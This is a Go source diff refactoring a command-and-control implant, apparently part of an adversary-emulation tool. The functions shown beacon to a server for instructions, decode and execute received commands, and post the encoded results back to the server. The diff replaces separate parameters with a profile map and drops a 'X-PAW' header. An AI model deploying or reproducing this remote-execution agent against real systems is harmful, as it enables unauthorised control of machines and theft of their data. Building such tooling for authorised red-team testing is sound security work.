@@ -6,9 +6,9 @@ import (
 	"net/http"
 	"os"
 	"io"
-	"runtime"
 	"io/ioutil"
 	"time"
+	"runtime"
 	"encoding/json"
 	"path/filepath"
 	"../util"
@@ -16,10 +16,10 @@ import (
 )
 
 // Instructions is a single call to the C2
-func Instructions(server string, group string, paw string) interface{} {
-	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "group": group})
-	address := fmt.Sprintf("%s/sand/instructions", server)
-	bites := request(address, paw, data)
+func Instructions(profile map[string]string) interface{} {
+	data, _ := json.Marshal(profile)
+	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
+	bites := request(address, data)
 	if bites != nil {
 		fmt.Println("[+] beacon: ALIVE")
 	} else {
@@ -51,23 +51,22 @@ func Drop(server string, payload string) {
 }
 
 // Execute executes a command and posts results
-func Execute(server string, paw string, command map[string]interface{}) {
+func Execute(profile map[string]string, command map[string]interface{}) {
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
-	result, err := execute.Execute(cmd)
+	result, err := execute.Execute(cmd, profile["executor"])
 	if err != nil {
 		status = "1"
 	}
-	address := fmt.Sprintf("%s/sand/results", server)
+	address := fmt.Sprintf("%s/sand/results", profile["server"])
 	link := fmt.Sprintf("%f", command["id"].(float64))
 	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
-	request(address, paw, data)
+	request(address, data)
 	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
 }
 
-func request(address string, paw string, data []byte) []byte {
+func request(address string, data []byte) []byte {
 	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
-	req.Header.Set("X-PAW", paw)
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
